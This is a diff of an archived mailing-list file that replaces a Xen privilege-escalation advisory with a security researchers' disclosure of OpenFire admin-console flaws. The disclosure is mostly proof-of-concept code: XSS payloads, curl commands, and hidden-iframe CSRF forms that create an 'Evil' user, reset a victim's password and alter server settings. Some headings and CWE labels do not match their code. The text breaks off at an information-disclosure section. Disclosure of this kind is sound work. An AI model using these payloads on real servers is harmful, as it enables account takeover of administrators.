@@ -1,157 +1,701 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/16/14
-Message-Id: <E1agGk8-0004TL-Uh@xenbits.xenproject.org>
-Date: Wed, 16 Mar 2016 19:04:28 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security@....org>
-Subject: Xen Security Advisory 171 (CVE-2016-3157) - I/O port access privilege escalation in x86-64 Linux
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/05/2
+Message-ID: <577BC26C.8030408@sysdream.com>
+Date: Tue, 5 Jul 2016 16:21:32 +0200
+From: Sysdream Labs <labs@...dream.com>
+To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com
+Subject: CVE ID Request : OpenFire multiple vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
-
-            Xen Security Advisory CVE-2016-3157 / XSA-171
-                              version 4
-
-         I/O port access privilege escalation in x86-64 Linux
-
-UPDATES IN VERSION 4
-====================
-
-Clarify Vulnerable Systems section.
-
-Public release.
-
-ISSUE DESCRIPTION
-=================
-
-IRET and POPF do not modify EFLAGS.IOPL when executed by code at a
-privilege level other than zero.  Since PV Xen guests run at privilege
-level 3 (for 64-bit ones; 32-bit ones run at privilege level 1), to
-compensate for this the context switching of EFLAGS.IOPL requires the
-guest to make use of a dedicated hypercall (PHYSDEVOP_set_iopl).  The
-invocation of this hypercall, while present in the 32-bit context
-switch path, is missing from its 64-bit counterpart.
-
-IMPACT
-======
-
-User mode processes not supposed to be able to access I/O ports may
-be granted such permission, potentially resulting in one or more of
-in-guest privilege escalation, guest crashes (Denial of Service), or
-in-guest information leaks.
-
-VULNERABLE SYSTEMS
-==================
-
-All upstream x86-64 Linux versions operating as PV Xen guests are
-vulnerable.
-
-ARM systems are not vulnerable.  x86 HVM guests are not vulnerable.
-32-bit Linux guests are not vulnerable.
-
-x86-64 Linux versions derived from linux-2.6.18-xen.hg (XenoLinux) are
-not vulnerable.
-
-We believe that non-Linux guests are not vulnerable, as we are not
-aware of any with an analogous bug.
-
-MITIGATION
-==========
-
-Running only HVM or 32-bit PV guests will avoid this issue.
-
-CREDITS
-=======
-
-This issue was discovered by Andy Lutomirski.
-
-RESOLUTION
-==========
-
-Applying the attached patch resolves this issue for the indicated Linux
-versions.
-
-xsa171.patch           Linux 4.5-rc7, Linux 4.4.x
-
-$ sha256sum xsa171*
-5d47ead1212c735b444ac8f82e7f311cda3473fe3847e576c3772ce020265dfd  xsa171.patch
-$
+# Several vulnerabilities doscovered in OpenFire version 3.10.2  to 4.0.1
 
 
-DEPLOYMENT DURING EMBARGO
-=========================
+## Product Description
 
-The patch is a change to the domU, ie, to the guest, not to hosts.
+**OpenFire** is an opensource project under GNU GPL licence. It provides a Jabber/XMPP server fully develloped in Java. It's develloped by the **Ignite realtime** community.
+The actual version of the product is 4.0.2. 
 
+Official web site : http://igniterealtime.org/
 
-Where the guest kernel is provided by the host administrator
-- ------------------------------------------------------------
+Several vulnerabilities have been discovered between 2015, October and 2016, February.
+Reported vulnerabilities are similar to those previously discovered by hyp3rlinx, although they concern different pages.
 
-Deployment of the patch by the host administrator is NOT permitted
-(except where all the affected systems and VMs are administered and
-used only by organisations which are members of the Xen Project
-Security Issues Predisclosure List).  Specifically, deployment on
-public cloud systems is NOT permitted.
+In brief, the flaws are of the following kinds: CSRF, XSS (reflected and stored), file upload and information disclosure. Most vulnerabilities need an administration access to the web application and may lead to personal information leakage or account take-over.
 
-This is because a the cloud guest administrator is almost certainly in
-a position to see the changes that are made by to the kernel even if
-the kernel is provided by the host administrator.
-
-Deployment is permitted only AFTER the embargo ends.
+**Ingnite realtime** fixed some vulnerabilities (the corresponding commit ID are indicated in this document).
 
 
-Where the guest kernel is provided by the guest administrator
-- -------------------------------------------------------------
+## Several Relected XSS Vulnerabilities identified in Openfire 3.10.2
 
-Deployment of the patch (or another which is substantially similar) by
-the guest administrator is permitted during the embargo ONLY if
- (i) the host administrator organisation is also a member of the Xen
-     Project Security Issues Predisclosure List.
- (ii) all the guest's users are also members of predisclosure list.
-     (guest users includes administrators of Linux containers running
-     within the guest).
+**Access Vector**: remote
 
-Restriction (i) is because the host administrator can see changes that
-made to the kernel by a guest administrator.  Restriction (ii) is
-because it is difficult to fully conceal the Linux kernel from
-unprivileged guest user processes.
+**Security Risk**: low
 
-If the host is not operated by a member of the predisclosure list, or
-the guest has users outside the predisclousre list, deployment is
-permitted only AFTER the embargo ends.
+**Vulnerability**: CWE-79
+
+**CVSS Base Score**: 5.2
+
+[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:L/A:N/E:F/RL:O
+
+### Vulnerability Description
+
+Several XSS vulnerabilities have been found on several pages of the administration panel. Reflected XSS may lead to session hijacking on admin user.
+
+### Proof of Concept
+
+#### *domain* and *remotePort* variables from *server2server-settings.jsp*
+
+The following POST values can be sent to trigger the vulnerability:
+
+```
+domain=%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&remotePort=5269&serverAllowed=Add+Server
+```
+
+or
+
+```
+domain=testt&remotePort=5269%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverAllowed=Add+Server
+```
+
+or
+
+```
+
+domain=%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverBlocked=Block+Server
+```
+
+You can reproduce the exploitation with the following curl commands:
+
+```
+curl --data "domain=%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&remotePort=5269&serverAllowed=Add+Server" https://OpenFireServerIP:9090/server2server-settings.jsp --cookie="JSESSIONID=XXX" 
+
+curl --data "domain=test&remotePort=5269%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverAllowed=Add+Server" https://OpenFireServerIP:9090/server2server-settings.jsp --cookie="JSESSIONID=XXX" 
+
+curl --data "domain=%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverBlocked=Block+Server" https://OpenFireServerIP:9090/server2server-settings.jsp --cookie="JSESSIONID=XXX" 
+```
+
+#### *criteria* variable from *plugins/search/advance-user-search.jsp*
+
+The following GET request exploits the XSS vulnerability:
+
+```
+http://OpenFireServerIP:9090/[[http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?search=true&moreOptions=false&criteria=admin%22/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&search=Search
+```
 
 
-In any case
-- -----------
+## Several stored XSS Vulnerabilities identified in Openfire 3.10.2
 
-Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
+**Access Vector**: remote
 
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, or whose situation is not clearly covered
-above, please contact the Xen Project Security Team.
+**Security Risk**: low
+
+**Vulnerability**: CWE-79
+
+**CVSS Base Score**: 5.5
+
+[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O
+
+### Vulnerability Description
+
+Several XSS vulnerabilities have been found on several pages of the administration panel. Stored XSS could lead to session hijacking on admin user.
+
+### Proof of Concept
+
+#### *mucdesc* variable from *muc-service-edit-form.jsp*
+
+The following POST values can be sent to trigger the vulnerability:
+
+```
+save=true&mucname=test&mucdesc=test%22%2F%3E%3Cscript%3Ealert%28%27XSS-2%27%29%3C%2Fscript%3E
+```
+
+The following code allows the creation of a web frame exploiting the vulnerability:
+
+```
+<iframe style="display:none" name="xss-frame"></iframe>
+<form id="xss-form" action="http://OpenFireServerIP:9090/muc-service-edit-form.jsp" >
+<input type="text" name="save" value="true" >
+<input type="text" name="mucname" value="test" >
+<input type="text" name="mucdesc" value="%22/><script>alert('XSS')</script>" >
+</form>
+
+<script>document.getElementById("xss-form").submit()</script>
+```
+
+or with this curl command:
+
+```
+curl --data "save=true&mucname=test&mucdesc=test%22%2F%3E%3Cscript%3Ealert%28%27XSS-2%27%29%3C%2Fscript%3E" https://OpenFireServerIP:9090/muc-service-edit-form.jsp --cookie="JSESSIONID=XXX"
+```
+
+#### *searchname* variable from *plugins/search/search-props-edit-form.jsp*
+
+The following POST values can be sent to trigger the vulnerability:
+
+```
+searchEnabled=true&searchname=search%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groupOnly=false
+```
+
+The following code allows the creation of a web frame exploiting the vulnerability:
+
+```
+<iframe style="display:none" name="xss-frame"></iframe>
+<form id="xss-form" action="http://OpenFireServerIP:9090/plugins/search/search-props-edit-form.jsp?save" method="post" target="xss-frame" >
+<input type="text" name="searchEnabled" value="true" >
+<input type="text" name="searchname" value="search%22/><script>alert('XSS')</script>" >
+<input type="text" name="groupOnly" value="false" >
+</form>
+
+<script>document.getElementById("xss-form").submit()</script>
+```
+
+or with this curl command:
+
+```
+curl "http://OpenFireServerIP:9090/plugins/search/search-props-edit-form.jsp" --data="searchEnabled=true&searchname=%22/%3E%3Cscript%3Ealert('XSS')%3C/script%3E&groupOnly=false" --cookie="JSESSIONID=XXX"
+```
 
 
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
+#### *searchname* variable from *page plugins/search/search-props-edit-form.jsp*
 
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
+The following POST values can be sent to trigger the vulnerability:
 
-iQEcBAEBAgAGBQJW6a4ZAAoJEIP+FMlX6CvZEs4H/12hKU3NzqfHZb/wOW9PeT4Z
-yhGQ2mkVE6FATW15b+/+Lr4N2nIUHa40BtWjPyEOQR4UXJrZr3R5HL/wINRO7c6M
-5XNjDyHqmfhOAsHWsrTB0a3CP2wWNNQ6LiBN5AuiUwoqiJiZPLhKCeEi99F+rFFK
-IINyOgd4XSeGRkb96GfZcPbizbO3wqiREfBIAjECYchBARv7JVGr3my6R3YBYdTn
-VtBratEPdkEmAEn0LtdiQlnjPib5O3paiaIDk41IPbPu1WPiozt3RJSqJUSwu+al
-A3qe9cBGz0NyghdYkXQjvaPP+1Q3BjyJC4hgGLo+yqyODPdaFAJZ0mjR/e0uajs=
-=F9Nz
------END PGP SIGNATURE-----
+```
+propName=adminConsole.port&propValue=9090%22+onmouseover%3D%22alert%28%27xxs%27%29%22+x%3D%22&encrypt=false&save=Save+Property
+```
 
-Download attachment "xsa171.patch" of type "application/octet-stream" (2095 bytes)
+The following code allows the creation of a web frame exploiting the vulnerability:
+
+```
+<iframe style="display:none" name="xss-frame"></iframe>
+<form id="xss-form" action="http://OpenFireServerIP:9090/server-properties.jsp" method="post" target="xss-frame" >
+<input type="text" name="propValue" value="=adminConsole.port" >
+<input type="text" name="searchname" value="9090%22 onmouseover=%22alert('XSS')%22 x="/>
+<input type="text" name="encrypt" value="false" >
+<input type="text" name="save" value="Save Property" >
+</form>
+
+<script>document.getElementById("xss-form").submit()</script>
+```
+
+or with this curl command:
+
+```
+curl --data "searchEnabled=true&searchname=search%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groupOnly=false" https://OpenFireServerIP:9090/plugins/search/search-props-edit-form.jsp --cookie="JSESSIONID=XXX"
+```
+
+#### *serverName* variable from *plugins/search/search-props-edit-form.jsp*
+
+The following POST values can be sent to trigger the vulnerability:
+
+```
+serverName=localhost.localdomain%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverPort=5269&componentPort=5275&port=5222&sslEnabled=true&sslPort=5223&embeddedPort=9090&embeddedSecurePort=9091&jmxEnabled=false&jmxSecure=true&jmxPort=1099&save=Save+Properties
+```
+
+The following code allows the creation of a web frame exploiting the vulnerability:
+
+```
+<iframe style="display:none" name="xss-frame"></iframe>
+<form id="xss-form" action="http://OpenFireServerIP:9090/server-props.jsp" method="post" target="xss-frame" >
+<input type="text" name="serverName" value="localhost.localdomain%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" >
+<input type="text" name="serverPort" value="5269" >
+<input type="text" name="componentPort" value="5275" >
+<input type="text" name="port" value="5222" >
+<input type="text" name="sslEnabled" value="true" >
+<input type="text" name="sslPort" value="5223" >
+<input type="text" name="embeddedPort" value="9090" >
+<input type="text" name="embeddedSecurePort" value="9091" >
+<input type="text" name="jmxEnabled" value="false" >
+<input type="text" name="jmxSecure" value="true" >
+<input type="text" name="jmxPort" value="1099" >
+<input type="text" name="save" value="Save+Properties" >
+</form>
+
+<script>document.getElementById("xss-form").submit()</script>
+```
+
+or with this curl command:
+
+```
+curl --data "serverName=localhost.localdomain%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverPort=5269&componentPort=5275&port=5222&sslEnabled=true&sslPort=5223&embeddedPort=9090&embeddedSecurePort=9091&jmxEnabled=false&jmxSecure=true&jmxPort=1099&save=Save+Properties" https://OpenFireServerIP:9090/server-props.jsp --cookie="JSESSIONID=XXX"
+```
+
+### Affected versions
+
+* Version >= 3.10.2 and < 4.0.0
+
+
+## Several Relected XSS Vulnerabilities identified in Openfire 4.0.0 and 4.0.1
+
+**Access Vector**: remote
+
+**Security Risk**: low
+
+**Vulnerability**: CWE-79
+
+**CVSS Base Score**: 5.2
+
+[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:L/A:N/E:F/RL:O
+
+### Vulnerability Description
+
+Several XSS vulnerabilities have been found on several pages of the administration panel. Reflected XSS could lead to session hijacking against an administrator.
+
+Some of these vulnerabilities have already been found by hyp3rlinx, but had not been patched properly.
+
+### Proof of Concept
+
+#### *groupchatName*, *groupchatJID*, *users* and *groups* variables from *page create-bookmark.jsp* suffer from the vulnerability
+
+The following POST values can be sent to trigger the vulnerability:
+
+```
+groupchatName=%22%3E%3Cscript%3Ealert%28%27XSS1%27%29%3C%2Fscript%3E&groupchatJID=%22%3E%3Cscript%3Ealert%28%27XSS2%27%29%3C%2Fscript%3E%C2%B2&users=%22%3E%3Cscript%3Ealert%28%27XSS3%27%29%3C%2Fscript%3E&groups=%22%3E%3Cscript%3Ealert%28%27XSS4%27%29%3C%2Fscript%3E&createGroupchatBookmark=Create&type=groupchat
+```
+
+The following curl command allows reproducing the attack against the Openfire *plugins/bookmarks/create-bookmark.jsp* page:
+
+```
+curl --data "save=true&mucname=conference&mucdesc=Public+Chatrooms%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" https://OpenFireServerIP:9090/muc-service-edit-form.jsp --cookie="JSESSIONID=XXX"
+```
+
+#### *search* variable from *group-summary.jsp*
+
+The following GET request exploit the XSS vulnerability:
+
+```
+http://OpenFireServerIP:9090/group-summary.jsp?search=test%22+onmouseover%3Dalert%28%27XSS%27%29+x%3D%22
+```
+
+The following curl command allows reproducing the attack against the Openfire *group-summary.jsp* page.
+
+```
+curl http://OpenFireServerIP:9090/group-summary.jsp?search=test%22+onmouseover%3Dalert%28%27XSS%27%29+x%3D%22 --cookie="JSESSIONID=XXX"
+```
+
+
+#### *maxTotalSize*, *maxFileSize*, *maxDays*, *logTimeout* variables from *audit-policy.jsp*
+
+The following GET request exploit the XSS vulnerability:
+
+```
+http://OpenFireServerIP:9090/audit-policy.jsp?auditEnabled=false&logDir=%2Fopt%2Fopenfire%2Flogs&maxTotalSize=1000%22%3E%3Cscript%3Ealert%28%27XSS3%27%29%3C%2Fscript%3E&maxFileSize=10%22%3E%3Cscript%3Ealert%28%27XSS4%27%29%3C%2Fscript%3E&maxDays=-1%22%3E%3Cscript%3Ealert%28%27XSS5%27%29%3C%2Fscript%3E&logTimeout=120%22%3E%3Cscript%3Ealert%28%27XSS6%27%29%3C%2Fscript%3E&ignore=&update=Save+Settings
+```
+
+The following curl command allows reproducing the attack against the Openfire *audit-policy.jsp* page:
+
+```
+curl "http://OpenFireServerIP:9090/audit-policy.jsp?auditEnabled=false&logDir=%2Fopt%2Fopenfire%2Flogs&maxTotalSize=1000%22%3E%3Cscript%3Ealert%28%27XSS3%27%29%3C%2Fscript%3E&maxFileSize=10%22%3E%3Cscript%3Ealert%28%27XSS4%27%29%3C%2Fscript%3E&maxDays=-1%22%3E%3Cscript%3Ealert%28%27XSS5%27%29%3C%2Fscript%3E&logTimeout=120%22%3E%3Cscript%3Ealert%28%27XSS6%27%29%3C%2Fscript%3E&ignore=&update=Save+Settings" --cookie="JSESSIONID=XXX"
+```
+
+#### *passPhrase* variables from *import-keystore-certificate.jsp*
+
+The following POST values exploit the XSS vulnerability:
+
+```
+passPhrase=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&privateKey=test&certificate=test&save=Save
+```
+
+The following curl command allows reproducing the attack against the Openfire *import-keystore-certificate.jsp* page.
+
+```
+curl http://OpenFireServerIP:9090/import-keystore-certificate.jsp --data="passPhrase=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&privateKey=test&certificate=test&save=Save" --cookie="JSESSIONID=XXX"
+```
+
+#### *criteria* variable from */plugins/search/advance-user-search.jsp*
+
+The following GET request exploit the XSS vulnerability:
+
+```
+http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?search=true&moreOptions=false&criteria=admin%22/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&search=Search
+```
+
+The following curl command allows reproducing the attack against the Openfire *plugins/search/advance-user-search.jsp* admin page.
+
+```
+curl "http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?search=true&moreOptions=false&criteria=admin%22/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&search=Search" --cookie="JSESSIONID=XXX"
+```
+
+### Affected versions
+
+* Version 4.0.0 and 4.0.1
+
+## Several stored XSS Vulnerabilities identified in Openfire 4.0.0 and 4.0.1
+
+Some of these vulnerabilities have already been found by hyp3rlinx, but has not been patched since.
+
+**Access Vector**: remote
+
+**Security Risk**: low
+
+**Vulnerability**: CWE-79
+
+**CVSS Base Score**: 5.5
+
+[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O
+
+### Vulnerability Description
+
+Several XSS vulnerabilities have been found on several pages of the administration panel. Stored XSS could lead to session hijacking on admin user.
+
+### Proof of Concept
+
+#### *subdomain* variable from *connection-settings-external-components.jsp*
+
+The following curl command allows reproducing the attack against the Openfire *connection-settings-external-components.jsp* page:
+
+```
+curl --data "subdomain=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&secret=toto&componentAllowed=Add+Component" https://OpenFireServerIP:9090/connection-settings-external-components.jsp --cookie="JSESSIONID=XXX"
+```
+
+Or
+
+```
+curl --data "subdomain=%22%3Escript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&componentBlocked=Block+Component" https://OpenFireServerIP:9090/connection-settings-external-components.jsp --cookie="JSESSIONID=XXX"
+```
+
+#### *mucdesc* variable from *muc-service-edit-form.jsp*
+
+The following curl command allows reproducing the attack against the Openfire *muc-service-edit-form.jsp* page:
+
+```
+curl --data "groupchatName=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groupchatJID=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%C2%B2&users=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groups=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&createGroupchatBookmark=Create&type=groupchat" https://OpenFireServerIP:9090/plugins/bookmarks/create-bookmark.jsp --cookie="JSESSIONID=XXX"
+```
+
+#### *groupchatName*, *groupchatJID*, *users* and *groups* variables from page muc-service-edit-form.jsp
+
+The following curl command allows reproducing the attack against the Openfire *muc-service-edit-form.jsp* page:
+
+```
+curl --data "groupchatName=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groupchatJID=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%C2%B2&users=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groups=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&createGroupchatBookmark=Create&type=groupchat" https://OpenFireServerIP:9090/plugins/bookmarks/create-bookmark.jsp --cookie="JSESSIONID=XXX"
+```
+
+#### *searchname* variable from *plugins/search/search-props-edit-form.jsp*
+
+The following curl command allows reproducing the attack against the Openfire *plugins/search/advance-user-search.jsp* page:
+
+```
+curl "http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?search=true&moreOptions=false&criteria=admin%22/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&search=Search" --cookie="JSESSIONID=XXX"
+```
+
+The folling code allows exploiting the vulnerability:
+
+```
+<iframe style="display:none" name="xss-frame"></iframe>
+<form id="xss-form" action="http://OpenFireServerIP:9090/plugins/search/search-props-edit-form.jsp?save" method="post" target="xss-frame" >
+<input type="text" name="searchEnabled" value="true" >
+<input type="text" name="searchname" value="search%22/><script>alert('XSS')</script>" >
+<input type="text" name="groupOnly" value="false" >
+</form>
+
+<script>document.getElementById("xss-form").submit()</script>
+```
+
+#### *propValue* variable from *server-properties.jsp*
+
+The following curl command allows reproducing the attack against the Openfire *server-properties.jsp* page:
+
+```
+curl --data="propName=adminConsole.port&propValue=9090%22+onmouseover%3D%22alert%28%27xxs%27%29%22+x%3D%22&encrypt=false&save=Save+Property" http://OpenFireServerIP:9090/server-properties.jsp --cookie="JSESSIONID=XXX"
+```
+
+The folling code allows exploiting the vulnerability:
+
+```
+<iframe style="display:none" name="xss-frame"></iframe>
+<form id="xss-form" action="http://OpenFireServerIP:9090/server-properties.jsp" method="post" target="xss-frame" >
+<input type="text" name="propValue" value="=adminConsole.port" >
+<input type="text" name="searchname" value="9090%22 onmouseover=%22alert('XSS')%22 x="/>
+<input type="text" name="encrypt" value="false" >
+<input type="text" name="save" value="Save Property" >
+</form>
+
+<script>document.getElementById("xss-form").submit()</script>
+```
+
+
+###Affected versions
+
+* Version 4.0.0 and 4.0.1
+
+
+## Several CSRF Vulnerabilities identified in Openfire 3.10.2
+
+**Access Vector**: remote
+
+**Security Risk**: low
+
+**Vulnerability**: CWE-312
+
+**CVSS Base Score**: 5.4
+
+[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O
+
+### Vulnerability Description
+
+Several CSRF vulnerabilities have been found on different pages of the admin panel of the OpenFire web server. Throught this attack an attacker could drive a valid user to execute unwittingly a request on the OpenFire sever.
+
+
+### Proof of Concept
+
+#### *connection-settings-external-components.jsp* page is vulerable to a CSRF attack.
+
+The following HTML iframe command allows reproducing the attack against the Openfire *dwr/exec/downloader.installPlugin.dwr* page:
+
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="csrf-form" action="http://OpenFireServerIP:9090/dwr/exec/downloader.installPlugin.dwr" method="post" target="csrf-frame" >
+    <input type="text" name="callCount" value="1" >
+    <input type="text" name="c0-scriptName" value="downloader" >
+    <input type="text" name="c0-methodName" value="installPlugin" >
+    <input type="text" name="c0-id" value="9033_1444939787005" >
+    <input type="text" name="c0-param0" value="string:http://www.igniterealtime.org/projects/openfire/plugins/broadcast.jar" >
+    <input type="text" name="c0-param1" value="string:8221154" >
+    <input type="text" name="xml" value="true" >
+</form>
+
+<script>document.getElementById("csrf-form").submit()</script>
+```
+
+
+#### *client-connections-settings.jsp* is vulerable to a CSRF attack.
+
+The following HTML iframe command allows reproducing the attack against the Openfire *client-connections-settings.jsp* page:
+
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="csrf-form" action="http://OpenFireServerIP:9090/client-connections-settings.jsp" method="post" target="csrf-frame" >
+    <input type="text" name="port" value="5222" >
+    <input type="text" name="sslEnabled" value="false" >
+    <input type="text" name="sslPort" value="5223" >
+    <input type="text" name="idleDisco" value="true" >
+    <input type="text" name="clientIdle" value="360" >
+    <input type="text" name="pingIdleClients" value="true" >
+    <input type="text" name="update" value="Save Settings" >
+</form>
+
+<script>document.getElementById("csrf-form").submit()</script>
+```
+
+#### *manage-updates.jsp* is vulerable to a CSRF attack.
+
+The following HTML iframe command allows reproducing the attack against the *Openfire manage-updates.jsp* page:
+
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="csrf-form" action="http://OpenFireServerIP:9090/manage-updates.jsp" method="post" target="csrf-frame" >
+    <input type="text" name="serviceEnabled" value="false" >
+    <input type="text" name="notificationsEnabled" value="false" >
+    <input type="text" name="proxyEnabled" value="true" >
+    <input type="text" name="proxyHost" value="10.0.0.1" >
+    <input type="text" name="proxyPort" value="6666" >
+    <input type="text" name="update" value="Save Settings" >
+</form>
+
+<script>document.getElementById("csrf-form").submit()</script>
+```
+
+#### *plugin-admin.jsp* is vulerable to a CSRF attack.
+
+The following HTML iframe command allows reproducing the attack against the Openfire *plugin-admin.jsp* page.
+
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="csrf-form" action="http://OpenFireServerIP:9090/plugin-admin.jsp" method="get" target="csrf-frame" >
+    <input type="text" name="deleteplugin" value="broadcast" >
+</form>
+
+
+<script>document.getElementById("csrf-form").submit()</script>
+```
+
+The following HTML iframe command allows reproducing the attack against the Openfire *reg-settings.jsp* page:
+
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="csrf-form" action="http://OpenFireServerIP:9090/reg-settings.jsp" method="get" target="csrf-frame" >
+    <input type="text" name="inbandEnabled" value="false" >
+    <input type="text" name="canChangePassword" value="false" >
+    <input type="text" name="anonLogin" value="fasle" >
+    <input type="text" name="allowedIPs" value="0.0.0.0" >
+    <input type="text" name="allowedAnonymIPs" value="0.0.0.0" >
+    <input type="text" name="save" value="Save Settings" >
+</form>
+
+
+<script>document.getElementById("csrf-form").submit()</script>
+```
+
+#### *server-properties.jsp* is vulerable to a CSRF attack.
+
+The following HTML iframe command allows reproducing the attack against the Openfire *server-properties.jsp* admin page.
+
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="csrf-form" action="http://OpenFireServerIP:9090/server-properties.jsp" method="post" target="csrf-frame" >
+    <input type="text" name="propName" value="test" >
+    <input type="text" name="propValue" value="test" >
+    <input type="text" name="encrypt" value=""false >
+    <input type="text" name="save" value="Save Property" >
+</form>
+
+<script>document.getElementById("csrf-form").submit()</script>
+```
+
+#### *system-email.jsp* is vulerable to a CSRF attack.
+
+The following HTML iframe command allows reproducing the attack against the Openfire *system-email.jsp* admin page.
+
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="csrf-form" action="http://OpenFireServerIP:9090/system-email.jsp" method="post" target="csrf-frame" >
+    <input type="text" name="host" value="mail.google.com" >
+    <input type="text" name="port" value="25" >
+    <input type="text" name="debug" value="false" >
+    <input type="text" name="server_username" value="toto" >
+    <input type="text" name="server_password" value="toto" >
+    <input type="text" name="save" value="Save Changes" >
+</form>
+```
+
+### Affected versions
+
+* Version >= 3.10.2 and < 4.0.0
+
+
+## Several CSRF Vulnerabilities identified in Openfire 3.10.2
+
+**Access Vector**: remote
+
+**Security Risk**: low
+
+**Vulnerability**: CWE-312
+
+**CVSS Base Score**: 5.4
+
+[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O
+
+### Vulnerability Description
+
+Several CSRF vulnerabilities have been found on different pages of the admin panel of the OpenFire web server. Through this attack, an attacker could drive a valid user to execute unwittingly a request to the OpenFire sever.
+
+These vulnerabilities have already been found by hyp3rlinx, but had not been patched yet.
+
+### Proof of Concept
+
+#### *connection-settings-external-components.jsp* is vulerable to a CSRF attack.
+
+The following HTML iframe command allows reproducing the attack against the Openfire *dwr/exec/downloader.installPlugin.dwr* page:
+
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="csrf-form" action="http://OpenFireServerIP:9090/user-create.jsp" method="get" target="csrf-frame" >
+    <input type="text" name="name" value="Evil" >
+    <input type="text" name="email" value="evil@...l.f" >
+    <input type="text" name="password" value="evil" >
+    <input type="text" name="passwordConfirm" value="evil" >
+    <input type="text" name="create" value="Create+User" >
+</form>
+
+<script>document.getElementById("csrf-form").submit()</script>
+```
+
+#### *client-connections-settings.jsp* is vulerable to a CSRF attack.
+
+The following HTML iframe command allows reproducing the attack against the Openfire *client-connections-settings.jsp* page.
+
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="csrf-form" action="http://OpenFireServerIP:9090/user-password.jsp" method="post" target="csrf-frame" >
+    <input type="text" name="username" value="victim" >
+    <input type="text" name="password" value="evil" >
+    <input type="text" name="passwordConfirm" value="evil" >
+    <input type="text" name="update" value="Update+Password" >
+</form>
+
+<script>document.getElementById("csrf-form").submit()</script>
+```
+
+### Affected versions
+
+* Version 4.0.0 and 4.0.1
+
+
+## Sensitive information disclosure in OpenFire Server <=3.10.2
+
+**Access Vector**: remote
+
+**Security Risk**: low
+
+**Vulnerability**: CWE-200
+
+**CVSS Base Score**: 5.5
+
